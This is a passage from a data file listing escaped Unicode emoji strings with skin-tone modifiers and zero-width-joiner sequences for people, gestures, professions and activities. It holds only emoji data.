\"\ud83e\uddcf\ud83c\udffd\", \"\ud83e\uddcf\ud83c\udffd\u200d\u2642\ufe0f\", \"\ud83e\udd26\ud83c\udffd\u200d\u2640\ufe0f\", \"\ud83e\udd26\ud83c\udffd\", \"\ud83e\udd26\ud83c\udffd\u200d\u2642\ufe0f\", \"\ud83e\udd37\ud83c\udffd\u200d\u2640\ufe0f\", \"\ud83e\udd37\ud83c\udffd\", \"\ud83e\udd37\ud83c\udffd\u200d\u2642\ufe0f\", \"\ud83d\ude4e\ud83c\udffd\u200d\u2640\ufe0f\", \"\ud83d\ude4e\ud83c\udffd\", \"\ud83d\ude4e\ud83c\udffd\u200d\u2642\ufe0f\", \"\ud83d\ude4d\ud83c\udffd\u200d\u2640\ufe0f\", \"\ud83d\ude4d\ud83c\udffd\", \"\ud83d\ude4d\ud83c\udffd\u200d\u2642\ufe0f\", \"\ud83d\udc87\ud83c\udffd\u200d\u2640\ufe0f\", \"\ud83d\udc87\ud83c\udffd\", \"\ud83d\udc87\ud83c\udffd\u200d\u2642\ufe0f\", \"\ud83d\udc86\ud83c\udffd\u200d\u2640\ufe0f\", \"\ud83d\udc86\ud83c\udffd\", \"\ud83d\udc86\ud83c\udffd\u200d\u2642\ufe0f\", \"\ud83e\uddd6\ud83c\udffd\u200d\u2640\ufe0f\", \"\ud83e\uddd6\ud83c\udffd\", \"\ud83e\uddd6\ud83c\udffd\u200d\u2642\ufe0f\", \"\ud83d\udc83\ud83c\udffd\", \"\ud83d\udd7a\ud83c\udffd\", \"\ud83d\udd74\ud83c\udffd\", \"\ud83d\udc69\ud83c\udffd\u200d\ud83e\uddbd\", \"\ud83e\uddd1\ud83c\udffd\u200d\ud83e\uddbd\", \"\ud83d\udc68\ud83c\udffd\u200d\ud83e\uddbd\", \"\ud83d\udc69\ud83c\udffd\u200d\ud83e\uddbc\", \"\ud83e\uddd1\ud83c\udffd\u200d\ud83e\uddbc\", \"\ud83d\udc68\ud83c\udffd\u200d\ud83e\uddbc\", \"\ud83d\udeb6\ud83c\udffd\u200d\u2640\ufe0f\", \"\ud83d\udeb6\ud83c\udffd\", \"\ud83d\udeb6\ud83c\udffd\u200d\u2642\ufe0f\", \"\ud83d\udc69\ud83c\udffd\u200d\ud83e\uddaf\", \"\ud83e\uddd1\ud83c\udffd\u200d\ud83e\uddaf\", \"\ud83d\udc68\ud83c\udffd\u200d\ud83e\uddaf\", \"\ud83e\uddce\ud83c\udffd\u200d\u2640\ufe0f\", \"\ud83e\uddce\ud83c\udffd\", \"\ud83e\uddce\ud83c\udffd\u200d\u2642\ufe0f\", \"\ud83c\udfc3\ud83c\udffd\u200d\u2640\ufe0f\", \"\ud83c\udfc3\ud83c\udffd\", \"\ud83c\udfc3\ud83c\udffd\u200d\u2642\ufe0f\", \"\ud83e\uddcd\ud83c\udffd\u200d\u2640\ufe0f\", \"\ud83e\uddcd\ud83c\udffd\", \"\ud83e\uddcd\ud83c\udffd\u200d\u2642\ufe0f\", \"\ud83d\udc6d\ud83c\udffd\", \"\ud83e\uddd1\ud83c\udffd\u200d\ud83e\udd1d\u200d\ud83e\uddd1\ud83c\udffd\", \"\ud83d\udc6c\ud83c\udffd\", \"\ud83d\udc6b\ud83c\udffd\", \"\ud83e\uddd7\ud83c\udffd\u200d\u2640\ufe0f\", \"\ud83e\uddd7\ud83c\udffd\", \"\ud83e\uddd7\ud83c\udffd\u200d\u2642\ufe0f\", \"\ud83c\udfc7\ud83c\udffd\", \"\ud83c\udfc2\ud83c\udffd\", \"\ud83c\udfcc\ud83c\udffd\u200d\u2640\ufe0f\", \"\ud83c\udfcc\ud83c\udffd\", \"\ud83c\udfcc\ud83c\udffd\u200d\u2642\ufe0f\", \"\ud83c\udfc4\ud83c\udffd\u200d\u2640\ufe0f\", \"\ud83c\udfc4\ud83c\udffd\", \"\ud83c\udfc4\ud83c\udffd\u200d\u2642\ufe0f\", \"\ud83d\udea3\ud83c\udffd\u200d\u2640\ufe0f\", \"\ud83d\udea3\ud83c\udffd\", \"\ud83d\udea3\ud83c\udffd\u200d\u2642\ufe0f\", \"\ud83c\udfca\ud83c\udffd\u200d\u2640\ufe0f\", \"\ud83c\udfca\ud83c\udffd\", \"\ud83c\udfca\ud83c\udffd\u200d\u2642\ufe0f\", \"\u26f9\ud83c\udffd\u200d\u2640\ufe0f\", \"\u26f9\ud83c\udffd\", \"\u26f9\ud83c\udffd\u200d\u2642\ufe0f\", \"\ud83c\udfcb\ud83c\udffd\u200d\u2640\ufe0f\", \"\ud83c\udfcb\ud83c\udffd\", \"\ud83c\udfcb\ud83c\udffd\u200d\u2642\ufe0f\", \"\ud83d\udeb4\ud83c\udffd\u200d\u2640\ufe0f\", \"\ud83d\udeb4\ud83c\udffd\", \"\ud83d\udeb4\ud83c\udffd\u200d\u2642\ufe0f\", \"\ud83d\udeb5\ud83c\udffd\u200d\u2640\ufe0f\", \"\ud83d\udeb5\ud83c\udffd\", \"\ud83d\udeb5\ud83c\udffd\u200d\u2642\ufe0f\", \"\ud83e\udd38\ud83c\udffd\u200d\u2640\ufe0f\", \"\ud83e\udd38\ud83c\udffd\", \"\ud83e\udd38\ud83c\udffd\u200d\u2642\ufe0f\", \"\ud83e\udd3d\ud83c\udffd\u200d\u2640\ufe0f\", \"\ud83e\udd3d\ud83c\udffd\", \"\ud83e\udd3d\ud83c\udffd\u200d\u2642\ufe0f\", \"\ud83e\udd3e\ud83c\udffd\u200d\u2640\ufe0f\", \"\ud83e\udd3e\ud83c\udffd\", \"\ud83e\udd3e\ud83c\udffd\u200d\u2642\ufe0f\", \"\ud83e\udd39\ud83c\udffd\u200d\u2640\ufe0f\", \"\ud83e\udd39\ud83c\udffd\", \"\ud83e\udd39\ud83c\udffd\u200d\u2642\ufe0f\", \"\ud83e\uddd8\ud83c\udffd\u200d\u2640\ufe0f\", \"\ud83e\uddd8\ud83c\udffd\", \"\ud83e\uddd8\ud83c\udffd\u200d\u2642\ufe0f\", \"\ud83d\udec0\ud83c\udffd\", \"\ud83d\udecc\ud83c\udffd\", \"\ud83d\udc4b\ud83c\udffe\", \"\ud83e\udd1a\ud83c\udffe\", \"\ud83d\udd90\ud83c\udffe\", \"\u270b\ud83c\udffe\", \"\ud83d\udd96\ud83c\udffe\", \"\ud83d\udc4c\ud83c\udffe\", \"\ud83e\udd0c\ud83c\udffe\", \"\ud83e\udd0f\ud83c\udffe\", \"\u270c\ud83c\udffe\", \"\ud83e\udd1e\ud83c\udffe\", \"\ud83e\udef0\ud83c\udffe\", \"\ud83e\udd1f\ud83c\udffe\", \"\ud83e\udd18\ud83c\udffe\", \"\ud83e\udd19\ud83c\udffe\", \"\ud83e\udef5\ud83c\udffe\", \"\ud83e\udef1\ud83c\udffe\", \"\ud83e\udef2\ud83c\udffe\", \"\ud83e\udef3\ud83c\udffe\", \"\ud83e\udef4\ud83c\udffe\", \"\ud83d\udc48\ud83c\udffe\", \"\ud83d\udc49\ud83c\udffe\", \"\ud83d\udc46\ud83c\udffe\", \"\ud83d\udd95\ud83c\udffe\", \"\ud83d\udc47\ud83c\udffe\", \"\u261d\ud83c\udffe\", \"\ud83d\udc4d\ud83c\udffe\", \"\ud83d\udc4e\ud83c\udffe\", \"\u270a\ud83c\udffe\", \"\ud83d\udc4a\ud83c\udffe\", \"\ud83e\udd1b\ud83c\udffe\", \"\ud83e\udd1c\ud83c\udffe\", \"\ud83d\udc4f\ud83c\udffe\", \"\ud83e\udef6\ud83c\udffe\", \"\ud83d\ude4c\ud83c\udffe\", \"\ud83d\udc50\ud83c\udffe\", \"\ud83e\udd32\ud83c\udffe\", \"\ud83d\ude4f\ud83c\udffe\", \"\u270d\ud83c\udffe\", \"\ud83d\udcaa\ud83c\udffe\", \"\ud83e\uddb5\ud83c\udffe\", \"\ud83e\uddb6\ud83c\udffe\", \"\ud83d\udc42\ud83c\udffe\", \"\ud83e\uddbb\ud83c\udffe\", \"\ud83d\udc43\ud83c\udffe\", \"\ud83d\udc76\ud83c\udffe\", \"\ud83d\udc67\ud83c\udffe\", \"\ud83e\uddd2\ud83c\udffe\", \"\ud83d\udc66\ud83c\udffe\", \"\ud83d\udc69\ud83c\udffe\", \"\ud83e\uddd1\ud83c\udffe\", \"\ud83d\udc68\ud83c\udffe\", \"\ud83d\udc69\ud83c\udffe\u200d\ud83e\uddb1\", \"\ud83e\uddd1\ud83c\udffe\u200d\ud83e\uddb1\", \"\ud83d\udc68\ud83c\udffe\u200d\ud83e\uddb1\", \"\ud83d\udc69\ud83c\udffe\u200d\ud83e\uddb0\", \"\ud83e\uddd1\ud83c\udffe\u200d\ud83e\uddb0\", \"\ud83d\udc68\ud83c\udffe\u200d\ud83e\uddb0\", \"\ud83d\udc71\ud83c\udffe\u200d\u2640\ufe0f\", \"\ud83d\udc71\ud83c\udffe\", \"\ud83d\udc71\ud83c\udffe\u200d\u2642\ufe0f\", \"\ud83d\udc69\ud83c\udffe\u200d\ud83e\uddb3\", \"\ud83e\uddd1\ud83c\udffe\u200d\ud83e\uddb3\", \"\ud83d\udc68\ud83c\udffe\u200d\ud83e\uddb3\", \"\ud83d\udc69\ud83c\udffe\u200d\ud83e\uddb2\", \"\ud83e\uddd1\ud83c\udffe\u200d\ud83e\uddb2\", \"\ud83d\udc68\ud83c\udffe\u200d\ud83e\uddb2\", \"\ud83e\uddd4\ud83c\udffe\u200d\u2640\ufe0f\", \"\ud83e\uddd4\ud83c\udffe\", \"\ud83e\uddd4\ud83c\udffe\u200d\u2642\ufe0f\", \"\ud83d\udc75\ud83c\udffe\", \"\ud83e\uddd3\ud83c\udffe\", \"\ud83d\udc74\ud83c\udffe\", \"\ud83d\udc72\ud83c\udffe\", \"\ud83d\udc73\ud83c\udffe\u200d\u2640\ufe0f\", \"\ud83d\udc73\ud83c\udffe\", \"\ud83d\udc73\ud83c\udffe\u200d\u2642\ufe0f\", \"\ud83e\uddd5\ud83c\udffe\", \"\ud83d\udc6e\ud83c\udffe\u200d\u2640\ufe0f\", \"\ud83d\udc6e\ud83c\udffe\", \"\ud83d\udc6e\ud83c\udffe\u200d\u2642\ufe0f\", \"\ud83d\udc77\ud83c\udffe\u200d\u2640\ufe0f\", \"\ud83d\udc77\ud83c\udffe\", \"\ud83d\udc77\ud83c\udffe\u200d\u2642\ufe0f\", \"\ud83d\udc82\ud83c\udffe\u200d\u2640\ufe0f\", \"\ud83d\udc82\ud83c\udffe\", \"\ud83d\udc82\ud83c\udffe\u200d\u2642\ufe0f\", \"\ud83d\udd75\ud83c\udffe\u200d\u2640\ufe0f\", \"\ud83d\udd75\ud83c\udffe\", \"\ud83d\udd75\ud83c\udffe\u200d\u2642\ufe0f\", \"\ud83d\udc69\ud83c\udffe\u200d\u2695\ufe0f\", \"\ud83e\uddd1\ud83c\udffe\u200d\u2695\ufe0f\", \"\ud83d\udc68\ud83c\udffe\u200d\u2695\ufe0f\", \"\ud83d\udc69\ud83c\udffe\u200d\ud83c\udf3e\", \"\ud83e\uddd1\ud83c\udffe\u200d\ud83c\udf3e\", \"\ud83d\udc68\ud83c\udffe\u200d\ud83c\udf3e\", \"\ud83d\udc69\ud83c\udffe\u200d\ud83c\udf73\", \"\ud83e\uddd1\ud83c\udffe\u200d\ud83c\udf73\", \"\ud83d\udc68\ud83c\udffe\u200d\ud83c\udf73\", \"\ud83d\udc69\ud83c\udffe\u200d\ud83c\udf93\", \"\ud83e\uddd1\ud83c\udffe\u200d\ud83c\udf93\", \"\ud83d\udc68\ud83c\udffe\u200d\ud83c\udf93\", \"\ud83d\udc69\ud83c\udffe\u200d\ud83c\udfa4\", \"\ud83e\uddd1\ud83c\udffe\u200d\ud83c\udfa4\", \"\ud83d\udc68\ud83c\udffe\u200d\ud83c\udfa4\", \"\ud83d\udc69\ud83c\udffe\u200d\ud83c\udfeb\", \"\ud83e\uddd1\ud83c\udffe\u200d\ud83c\udfeb\", \"\ud83d\udc68\ud83c\udffe\u200d\ud83c\udfeb\", \"\ud83d\udc69\ud83c\udffe\u200d\ud83c\udfed\", \"\ud83e\uddd1\ud83c\udffe\u200d\ud83c\udfed\", \"\ud83d\udc68\ud83c\udffe\u200d\ud83c\udfed\", \"\ud83d\udc69\ud83c\udffe\u200d\ud83d\udcbb\", \"\ud83e\uddd1\ud83c\udffe\u200d\ud83d\udcbb\", \"\ud83d\udc68\ud83c\udffe\u200d\ud83d\udcbb\", \"\ud83d\udc69\ud83c\udffe\u200d\ud83d\udcbc\", \"\ud83e\uddd1\ud83c\udffe\u200d\ud83d\udcbc\", \"\ud83d\udc68\ud83c\udffe\u200d\ud83d\udcbc\", \"\ud83d\udc69\ud83c\udffe\u200d\ud83d\udd27\", \"\ud83e\uddd1\ud83c\udffe\u200d\ud83d\udd27\", \"\ud83d\udc68\ud83c\udffe\u200d\ud83d\udd27\", \"\ud83d\udc69\ud83c\udffe\u200d\ud83d\udd2c\", \"\ud83e\uddd1\ud83c\udffe\u200d\ud83d\udd2c\", \"\ud83d\udc68\ud83c\udffe\u200d\ud83d\udd2c\", \"\ud83d\udc69\ud83c\udffe\u200d\ud83c\udfa8\", \"\ud83e\uddd1\ud83c\udffe\u200d\ud83c\udfa8\", \"\ud83d\udc68\ud83c\udffe\u200d\ud83c\udfa8\", \"\ud83d\udc69\ud83c\udffe\u200d\ud83d\ude92\", \"\ud83e\uddd1\ud83c\udffe\u200d\ud83d\ude92\", \"\ud83d\udc68\ud83c\udffe\u200d\ud83d\ude92\", \"\ud83d\udc69\ud83c\udffe\u200d\u2708\ufe0f\", \"\ud83e\uddd1\ud83c\udffe\u200d\u2708\ufe0f\", \"\ud83d\udc68\ud83c\udffe\u200d\u2708\ufe0f\", \"\ud83d\udc69\ud83c\udffe\u200d\ud83d\ude80\", \"\ud83e\uddd1\ud83c\udffe\u200d\ud83d\ude80\", \"\ud83d\udc68\ud83c\udffe\u200d\ud83d\ude80\", \"\ud83d\udc69\ud83c\udffe\u200d\u2696\ufe0f\", \"\ud83e\uddd1\ud83c\udffe\u200d\u2696\ufe0f\", \"\ud83d\udc68\ud83c\udffe\u200d\u2696\ufe0f\", \"\ud83d\udc70\ud83c\udffe\u200d\u2640\ufe0f\", \"\ud83d\udc70\ud83c\udffe\", \"\ud83d\udc70\ud83c\udffe\u200d\u2642\ufe0f\", \"\ud83e\udd35\ud83c\udffe\u200d\u2640\ufe0f\", \"\ud83e\udd35\ud83c\udffe\", \"\ud83e\udd35\ud83c\udffe\u200d\u2642\ufe0f\", \"\ud83d\udc78\ud83c\udffe\", \"\ud83e\udec5\ud83c\udffe\", \"\ud83e\udd34\ud83c\udffe\", \"\ud83e\udd77\ud83c\udffe\", \"\ud83e\uddb8\ud83c\udffe\u200d\u2640\ufe0f\", \"\ud83e\uddb8\ud83c\udffe\", \"\ud83e\uddb8\ud83c\udffe\u200d\u2642\ufe0f\", \"\ud83e\uddb9\ud83c\udffe\u200d\u2640\ufe0f\", \"\ud83e\uddb9\ud83c\udffe\", \"\ud83e\uddb9\ud83c\udffe\u200d\u2642\ufe0f\", \"\ud83e\udd36\ud83c\udffe\", \"\ud83e\uddd1\ud83c\udffe\u200d\ud83c\udf84\", \"\ud83c\udf85\ud83c\udffe\", \"\ud83e\uddd9\ud83c\udffe\u200d\u2640\ufe0f\", \"\ud83e\uddd9\ud83c\udffe\", \"\ud83e\uddd9\ud83c\udffe\u200d\u2642\ufe0f\", \"\ud83e\udddd\ud83c\udffe\u200d\u2640\ufe0f\", \"\ud83e\udddd\ud83c\udffe\", \"\ud83e\udddd\ud83c\udffe\u200d\u2642\ufe0f\", \"\ud83e\udddb\ud83c\udffe\u200d\u2640\ufe0f\", \"\ud83e\udddb\ud83c\udffe\", \"\ud83e\udddb\ud83c\udffe\u200d\u2642\ufe0f\", \"\ud83e\udddc\ud83c\udffe\u200d\u2640\ufe0f\", \"\ud83e\udddc\ud83c\udffe\", \"\ud83e\udddc\ud83c\udffe\u200d\u2642\ufe0f\", \"\ud83e\uddda\ud83c\udffe\u200d\u2640\ufe0f\", \"\ud83e\uddda\ud83c\udffe\", \"\ud83e\uddda\ud83c\udffe\u200d\u2642\ufe0f\", \"\ud83d\udc7c\ud83c\udffe\", \"\ud83e\udd30\ud83c\udffe\", \"\ud83e\udec4\ud83c\udffe\", \"\ud83e\udec3\ud83c\udffe\", \"\ud83e\udd31\ud83c\udffe\", \"\ud83d\udc69\ud83c\udffe\u200d\ud83c\udf7c\", \"\ud83e\uddd1\ud83c\udffe\u200d\ud83c\udf7c\", \"\ud83d\udc68\ud83c\udffe\u200d\ud83c\udf7c\", \"\ud83d\ude47\ud83c\udffe\u200d\u2640\ufe0f\", \"\ud83d\ude47\ud83c\udffe\", \"\ud83d\ude47\ud83c\udffe\u200d\u2642\ufe0f\", \"\ud83d\udc81\ud83c\udffe\u200d\u2640\ufe0f\", \"\ud83d\udc81\ud83c\udffe\", \"\ud83d\udc81\ud83c\udffe\u200d\u2642\ufe0f\", \"\ud83d\ude45\ud83c\udffe\u200d\u2640\ufe0f\", \"\ud83d\ude45\ud83c\udffe\", \"\ud83d\ude45\ud83c\udffe\u200d\u2642\ufe0f\", \"\ud83d\ude46\ud83c\udffe\u200d\u2640\ufe0f\", \"\ud83d\ude46\ud83c\udffe\", \"\ud83d\ude46\ud83c\udffe\u200d\u2642\ufe0f\", \"\ud83d\ude4b\ud83c\udffe\u200d\u2640\ufe0f\", \"\ud83d\ude4b\ud83c\udffe\", \"\ud83d\ude4b\ud83c\udffe\u200d\u2642\ufe0f\", \"\ud83e\uddcf\ud83c\udffe\u200d\u2640\ufe0f\", \"\ud83e\uddcf\ud83c\udffe\", \"\ud83e\uddcf\ud83c\udffe\u200d\u2642\ufe0f\", \"\ud83e\udd26\ud83c\udffe\u200d\u2640\ufe0f\", \"\ud83e\udd26\ud83c\udffe\", \"\ud83e\udd26\ud83c\udffe\u200d\u2642\ufe0f\", \"\ud83e\udd37\ud83c\udffe\u200d\u2640\ufe0f\", \"\ud83e\udd37\ud83c\udffe\", \"\ud83e\udd37\ud83c\udffe\u200d\u2642\ufe0f\", \"\ud83d\ude4e\ud83c\udffe\u200d\u2640\ufe0f\", \"\ud83d\ude4e\ud83c\udffe\", \"\ud83d\ude4e\ud83c\udffe\u200d\u2642\ufe0f\", \"\ud83d\ude4d\ud83c\udffe\u200d\u2640\ufe0f\", \"\ud83d\ude4d\ud83c\udffe\", \"\ud83d\ude4d\ud83c\udffe\u200d\u2642\ufe0f\", \"\ud83d\udc87\ud83c\udffe\u200d\u2640\ufe0f\", \"\ud83d\udc87\ud83c\udffe\", \"\ud83d\udc87\ud83c\udffe\u200d\u2642\ufe0f\", \"\ud83d\udc86\ud83c\udffe\u200d\u2640\ufe0f\", \"\ud83d\udc86\ud83c\udffe\", \"\ud83d\udc86\ud83c\udffe\u200d\u2642\ufe0f\", \"\ud83e\uddd6\ud83c\udffe\u200d\u2640\ufe0f\", \"\ud83e\uddd6\ud83c\udffe\", \"\ud83e\uddd6\ud83c\udffe\u200d\u2642\ufe0f\", \"\ud83d\udc83\ud83c\udffe\", \"\ud83d\udd7a\ud83c\udffe\", \"\ud83d\udc69\ud83c\udffe\u200d\ud83e\uddbd\", \"\ud83e\uddd1\ud83c\udffe\u200d\ud83e\uddbd\", \"\ud83d\udc68\ud83c\udffe\u200d\ud83e\uddbd\", \"\ud83d\udc69\ud83c\udffe\u200d\ud83e\uddbc\", \"\ud83e\uddd1\ud83c\udffe\u200d\ud83e\uddbc\", \"\ud83d\udc68\ud83c\udffe\u200d\ud83e\uddbc\", \"\ud83d\udeb6\ud83c\udffe\u200d\u2640\ufe0f\", \"\ud83d\udeb6\ud83c\udffe\", \"\ud83d\udeb6\ud83c\udffe\u200d\u2642\ufe0f\", \"\ud83d\udc69\ud83c\udffe\u200d\ud83e\uddaf\", \"\ud83e\uddd1\ud83c\udffe\u200d\ud83e\uddaf\", \"\ud83d\udc68\ud83c\udffe\u200d\ud83e\uddaf\", \"\ud83e\uddce\ud83c\udffe\u200d\u2640\ufe0f\", \"\ud83e\uddce\ud83c\udffe\", \"\ud83e\uddce\ud83c\udffe\u200d\u2642\ufe0f\", \"\ud83c\udfc3\ud83c\udffe\u200d\u2640\ufe0f\", \"\ud83c\udfc3\ud83c\udffe\", \"\ud83c\udfc3\ud83c\udffe\u200d\u2642\ufe0f\", \"\ud83e\uddcd\ud83c\udffe\u200d\u2640\ufe0f\", \"\ud83e\uddcd\ud83c\udffe\", \"\ud83e\uddcd\ud83c\udffe\u200d\u2642\ufe0f\", \"\ud83d\udc6d\ud83c\udffe\", \"\ud83e\uddd1\ud83c\udffe\u200d\ud83e\udd1d\u200d\ud83e\uddd1\ud83c\udffe\", \"\ud83d\udc6c\ud83c\udffe\", \"\ud83d\udc6b\ud83c\udffe\", \"\ud83e\uddd7\ud83c\udffe\u200d\u2640\ufe0f\", \"\ud83e\uddd7\ud83c\udffe\", \"\ud83e\uddd7\ud83c\udffe\u200d\u2642\ufe0f\", \"\ud83c\udfc7\ud83c\udffe\", \"\ud83c\udfc2\ud83c\udffe\", \"\ud83c\udfcc\ud83c\udffe\u200d\u2640\ufe0f\", \"\ud83c\udfcc\ud83c\udffe\", \"\ud83c\udfcc\ud83c\udffe\u200d\u2642\ufe0f\", \"\ud83c\udfc4\ud83c\udffe\u200d\u2640\ufe0f\", \"\ud83c\udfc4\ud83c\udffe\", \"\ud83c\udfc4\ud83c\udffe\u200d\u2642\ufe0f\", \"\ud83d\udea3\ud83c\udffe\u200d\u2640\ufe0f\", \"\ud83d\udea3\ud83c\udffe\", \"\ud83d\udea3\ud83c\udffe\u200d\u2642\ufe0f\", \"\ud83c\udfca\ud83c\udffe\u200d\u2640\ufe0f\", \"\ud83c\udfca\ud83c\udffe\", \"\ud83c\udfca\ud83c\udffe\u200d\u2642\ufe0f\", \"\u26f9\ud83c\udffe\u200d\u2640\ufe0f\", \"\u26f9\ud83c\udffe\", \"\u26f9\ud83c\udffe\u200d\u2642\ufe0f\", \"\ud83c\udfcb\ud83c\udffe\u200d\u2640\ufe0f\", \"\ud83c\udfcb\ud83c\udffe\", \"\ud83c\udfcb\ud83c\udffe\u200d\u2642\ufe0f\", \"\ud83d\udeb4\ud83c\udffe\u200d\u2640\ufe0f\", \"\ud83d\udeb4\ud83c\udffe\", \"\ud83d\udeb4\ud83c\udffe\u200d\u2642\ufe0f\", \"\ud83d\udeb5\ud83c\udffe\u200d\u2640\ufe0f\", \"\ud83d\udeb5\ud83c\udffe\", \"\ud83d\udeb5\ud83c\udffe\u200d\u2642\ufe0f\", \"\ud83e\udd38\ud83c\udffe\u200d\u2640\ufe0f\", \"\ud83e\udd38\ud83c\udffe\", \"\ud83e\udd38\ud83c\udffe\u200d\u2642\ufe0f\", \"\ud83e\udd3d\ud83c\udffe\u200d\u2640\ufe0f\", \"\ud83e\udd3d\ud83c\udffe\", \"\ud83e\udd3d\ud83c\udffe\u200d\u2642\ufe0f\", \"\ud83e\udd3e\ud83c\udffe\u200d\u2640\ufe0f\", \"\ud83e\udd3e\ud83c\udffe\", \"\ud83e\udd3e\ud83c\udffe\u200d\u2642\ufe0f\", \"\ud83e\udd39\ud83c\udffe\u200d\u2640\ufe0f\", \"\ud83e\udd39\ud83c\udffe\", \"\ud83e\udd39\ud83c\udffe\u200d\u2642\ufe0f\", \"\ud83e\uddd8\ud83c\udffe\u200d\u2640\ufe0f\", \"\ud83e\uddd8\ud83c\udffe\", \"\ud83e\uddd8\ud83c\udffe\u200d\u2642\ufe0f\", \"\ud83d\udec0\ud83c\udffe\", \"\ud83d\udecc\ud83c\udffe\", \"\ud83d\udc4b\ud83c\udfff\", \"\ud83e\udd1a\ud83c\udfff\", \"\ud83d\udd90\ud83c\udfff\", \"\u270b\ud83c\udfff\", \"\ud83d\udd96\ud83c\udfff\", \"\ud83d\udc4c\ud83c\udfff\", \"\ud83e\udd0c\ud83c\udfff\", \"\ud83e\udd0f\ud83c\udfff\", \"\u270c\ud83c\udfff\", \"\ud83e\udd1e\ud83c\udfff\", \"\ud83e\udef0\ud83c\udfff\", \"\ud83e\udd1f\ud83c\udfff\", \"\ud83e\udd18\ud83c\udfff\", \"\ud83e\udd19\ud83c\udfff\", \"\ud83e\udef5\ud83c\udfff\", \"\ud83e\udef1\ud83c\udfff\", \"\ud83e\udef2\ud83c\udfff\", \"\ud83e\udef3\ud83c\udfff\", \"\ud83e\udef4\ud83c\udfff\", \"\ud83d\udc48\ud83c\udfff\", \"\ud83d\udc49\ud83c\udfff\", \"\ud83d\udc46\ud83c\udfff\", \"\ud83d\udd95\ud83c\udfff\", \"\ud83d\udc47\ud83c\udfff\", \"\u261d\ud83c\udfff\", \"\ud83d\udc4d\ud83c\udfff\", \"\ud83d\udc4e\ud83c\udfff\", \"\u270a\ud83c\udfff\", \"\ud83d\udc4a\ud83c\udfff\", \"\ud83e\udd1b\ud83c\udfff\", \"\ud83e\udd1c\ud83c\udfff\", \"\ud83d\udc4f\ud83c\udfff\", \"\ud83e\udef6\ud83c\udfff\", \"\ud83d\ude4c\ud83c\udfff\", \"\ud83d\udc50\ud83c\udfff\", \"\ud83e\udd32\ud83c\udfff\", \"\ud83d\ude4f\ud83c\udfff\", \"\u270d\ud83c\udfff\", \"\ud83e\udd33\ud83c\udfff\", \"\ud83d\udcaa\ud83c\udfff\", \"\ud83e\uddb5\ud83c\udfff\", \"\ud83e\uddb6\ud83c\udfff\", \"\ud83d\udc42\ud83c\udfff\", \"\ud83e\uddbb\ud83c\udfff\", \"\ud83d\udc43\ud83c\udfff\", \"\ud83d\udc76\ud83c\udfff\", \"\ud83d\udc67\ud83c\udfff\", \"\ud83e\uddd2\ud83c\udfff\", \"\ud83d\udc66\ud83c\udfff\", \"\ud83d\udc69\ud83c\udfff\", \"\ud83e\uddd1\ud83c\udfff\", \"\ud83d\udc68\ud83c\udfff\", \"\ud83d\udc69\ud83c\udfff\u200d\ud83e\uddb1\", \"\ud83e\uddd1\ud83c\udfff\u200d\ud83e\uddb1\", \"\ud83d\udc68\ud83c\udfff\u200d\ud83e\uddb1\", \"\ud83d\udc69\ud83c\udfff\u200d\ud83e\uddb0\", \"\ud83e\uddd1\ud83c\udfff\u200d\ud83e\uddb0\", \"\ud83d\udc68\ud83c\udfff\u200d\ud83e\uddb0\", \"\ud83d\udc71\ud83c\udfff\u200d\u2640\ufe0f\", \"\ud83d\udc71\ud83c\udfff\", \"\ud83d\udc71\ud83c\udfff\u200d\u2642\ufe0f\", \"\ud83d\udc69\ud83c\udfff\u200d\ud83e\uddb3\", \"\ud83e\uddd1\ud83c\udfff\u200d\ud83e\uddb3\", \"\ud83d\udc68\ud83c\udfff\u200d\ud83e\uddb3\", \"\ud83d\udc69\ud83c\udfff\u200d\ud83e\uddb2\", \"\ud83e\uddd1\ud83c\udfff\u200d\ud83e\uddb2\", \"\ud83d\udc68\ud83c\udfff\u200d\ud83e\uddb2\", \"\ud83e\uddd4\ud83c\udfff\u200d\u2640\ufe0f\", \"\ud83e\uddd4\ud83c\udfff\", \"\ud83e\uddd4\ud83c\udfff\u200d\u2642\ufe0f\", \"\ud83d\udc75\ud83c\udfff\", \"\ud83e\uddd3\ud83c\udfff\", \"\ud83d\udc74\ud83c\udfff\", \"\ud83d\udc72\ud83c\udfff\", \"\ud83d\udc73\ud83c\udfff\u200d\u2640\ufe0f\", \"\ud83d\udc73\ud83c\udfff\", \"\ud83d\udc73\ud83c\udfff\u200d\u2642\ufe0f\", \"\ud83e\uddd5\ud83c\udfff\", \"\ud83d\udc6e\ud83c\udfff\u200d\u2640\ufe0f\", \"\ud83d\udc6e\ud83c\udfff\", \"\ud83d\udc6e\ud83c\udfff\u200d\u2642\ufe0f\", \"\ud83d\udc77\ud83c\udfff\u200d\u2640\ufe0f\", \"\ud83d\udc77\ud83c\udfff\", \"\ud83d\udc77\ud83c\udfff\u200d\u2642\ufe0f\", \"\ud83d\udc82\ud83c\udfff\u200d\u2640\ufe0f\", \"\ud83d\udc82\ud83c\udfff\", \"\ud83d\udc82\ud83c\udfff\u200d\u2642\ufe0f\", \"\ud83d\udd75\ud83c\udfff\u200d\u2640\ufe0f\", \"\ud83d\udd75\ud83c\udfff\", \"\ud83d\udd75\ud83c\udfff\u200d\u2642\ufe0f\", \"\ud83d\udc69\ud83c\udfff\u200d\u2695\ufe0f\", \"\ud83e\uddd1\ud83c\udfff\u200d\u2695\ufe0f\", \"\ud83d\udc68\ud83c\udfff\u200d\u2695\ufe0f\", \"\ud83d\udc69\ud83c\udfff\u200d\ud83c\udf3e\", \"\ud83e\uddd1\ud83c\udfff\u200d\ud83c\udf3e\", \"\ud83d\udc68\ud83c\udfff\u200d\ud83c\udf3e\", \"\ud83d\udc69\ud83c\udfff\u200d\ud83c\udf73\", \"\ud83e\uddd1\ud83c\udfff\u200d\ud83c\udf73\", \"\ud83d\udc68\ud83c\udfff\u200d\ud83c\udf73\", \"\ud83d\udc69\ud83c\udfff\u200d\ud83c\udf93\", \"\ud83e\uddd1\ud83c\udfff\u200d\ud83c\udf93\", \"\ud83d\udc68\ud83c\udfff\u200d\ud83c\udf93\", \"\ud83d\udc69\ud83c\udfff\u200d\ud83c\udfa4\", \"\ud83e\uddd1\ud83c\udfff\u200d\ud83c\udfa4\", \"\ud83d\udc68\ud83c\udfff\u200d\ud83c\udfa4\", \"\ud83d\udc69\ud83c\udfff\u200d\ud83c\udfeb\", \"\ud83e\uddd1\ud83c\udfff\u200d\ud83c\udfeb\", \"\ud83d\udc68\ud83c\udfff\u200d\ud83c\udfeb\", \"\ud83d\udc69\ud83c\udfff\u200d\ud83c\udfed\", \"\ud83e\uddd1\ud83c\udfff\u200d\ud83c\udfed\", 